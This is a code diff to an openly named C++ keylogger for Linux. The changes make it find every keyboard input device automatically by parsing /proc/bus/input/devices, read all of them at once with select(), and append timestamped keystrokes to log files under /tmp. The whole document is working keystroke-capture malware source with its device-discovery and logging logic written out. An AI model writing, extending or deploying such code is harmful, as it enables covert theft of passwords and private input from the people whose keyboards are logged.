@@ -1,5 +1,9 @@
+#include <fcntl.h>
 #include <linux/input.h>
+#include <sys/select.h>
+#include <unistd.h>
 
+#include <csignal>
 #include <chrono>
 #include <cstring>
 #include <ctime>
@@ -8,13 +12,14 @@
 #include <map>
 #include <string>
 #include <vector>
+#include <regex>
 
 #define LOGS_DIRECTORY "/tmp/"
 
 struct keylogger_ctx {
   bool is_capslock_on;
   bool is_shift_pressed;
-  std::string kb_file;
+  std::vector<std::string> kb_files;
   std::vector<char> kb_buffer;
   int buffer_cursor;
   struct input_event event;
@@ -34,6 +39,9 @@ void handle_delete(struct keylogger_ctx *);
 void handle_arrow(struct keylogger_ctx *);
 void handle_shift(struct keylogger_ctx *);
 
+volatile std::sig_atomic_t must_stop{0};
+
+/* key mapping */
 static const std::map<int, struct key_event_handler> handlers{
     {KEY_0, {'0', ')', handle_key}},
     {KEY_1, {'1', '!', handle_key}},
@@ -85,27 +93,36 @@ static const std::map<int, struct key_event_handler> handlers{
     {KEY_LEFT, {'\0', '\0', handle_arrow}},
     {KEY_LEFTSHIFT, {'\0', '\0', handle_shift}}};
 
-std::vector<std::string> get_keyboard_files() {
-  // std::ifstream file{"/proc/bus/input/devices"};
-  std::vector<std::string> list;
-  // std::vector<std::string> content;
-  // std::string line;
-
-  // for (int i = 0; std::getline(file, line); i++) {
-  //    if (!line.compare("")) {
-  //        for (auto &line : content) {
-  //            if (line.find("EV=120013")) {
-
-  //            }
-
-  //        }
-  //    } else {
-  //        content.emplace_back(line);
-  //    }
-  //}
-
-  return list;
+void sig_handler(int sig_num) {
+  must_stop = 1;
 }
+
+std::vector<std::string> get_event_files() {
+  std::ifstream file{"/proc/bus/input/devices"};
+  std::regex kb_regex{"H: Handlers=sysrq kbd (.+?) leds"};
+  std::vector<std::string> content;
+  std::string line;
+  std::smatch match;
+
+  for (int i = 0; std::getline(file, line); i++) {
+    if (std::regex_search(line, match, kb_regex)) {
+      content.emplace_back(match[1]);
+    }
+  }
+
+  return content;
+}
+
+std::vector<std::string> get_keyboard_files() {
+  std::vector<std::string> kb_files;
+
+  for (auto &event : get_event_files()) {
+    kb_files.emplace_back("/dev/input/" + event);
+  }
+
+  return kb_files;
+}
+
 
 void handle_key(struct keylogger_ctx *ctx) {
   if (!ctx->event.value) {
@@ -140,7 +157,7 @@ void handle_enter(struct keylogger_ctx *ctx) {
                   std::localtime(&now));
   }
 
-  std::ofstream log_file{std::string{LOGS_DIRECTORY} + "log_" + date,
+  std::ofstream log_file{std::string{LOGS_DIRECTORY} + "log_" + date + ".txt",
                          std::ios::app};
 
   log_file << "[" << timestamp << "] ";
@@ -195,22 +212,50 @@ void handle_arrow(struct keylogger_ctx *ctx) {
 }
 
 int run(struct keylogger_ctx *ctx) {
-  std::ifstream kb_file{ctx->kb_file};
+  std::vector<int> fds;
   struct input_event ev;
+  fd_set rfds;
 
-  while (1) {
-    kb_file.read((char *)&ev, sizeof(struct input_event));
+  for (auto &file : ctx->kb_files) {
+    int fd = open(file.c_str(), O_RDONLY);
 
-    if (ev.type == EV_KEY) {
-      try {
-        auto ev_handler = handlers.at(ev.code);
+    fds.emplace_back(fd);
+  }
 
-        ctx->event = ev;
-        ev_handler.cb(ctx);
-      } catch (...) {
-        std::cerr << "no event handler for key " << ev.code << std::endl;
+  while (!must_stop) {
+    FD_ZERO(&rfds);
+
+    for (auto &fd : fds) {
+      FD_SET(fd, &rfds);
+    }
+
+    int ret = select(*(fds.end() - 1) + 1, &rfds, nullptr, nullptr, nullptr);
+
+    if (ret == -1) {
+      continue;
+    }
+
+    for (auto &fd : fds) {
+      if (FD_ISSET(fd, &rfds)) {
+        int n_bytes = read(fd, &ev, sizeof(struct input_event));
+
+        if ((ev.type == EV_KEY) && (n_bytes > 0)) {
+          try {
+            auto ev_handler = handlers.at(ev.code);
+
+            ctx->event = ev;
+            ev_handler.cb(ctx);
+          } catch (...) {
+            std::cerr << "no event handler for key " << ev.code << std::endl;
+          }
+        }
       }
     }
+
+  }
+
+  for (auto &fd : fds) {
+    close(fd);
   }
 
   return EXIT_SUCCESS;
@@ -220,8 +265,11 @@ void deamonize() {}
 
 int main() {
   struct keylogger_ctx ctx = {.is_capslock_on = false,
-                              .kb_file = "/dev/input/event0",  // TODO
+                              .kb_files = get_keyboard_files(),
                               .buffer_cursor = 0};
+
+  std::signal(SIGINT, sig_handler);
+
   int ret = run(&ctx);
 
   std::exit(ret);
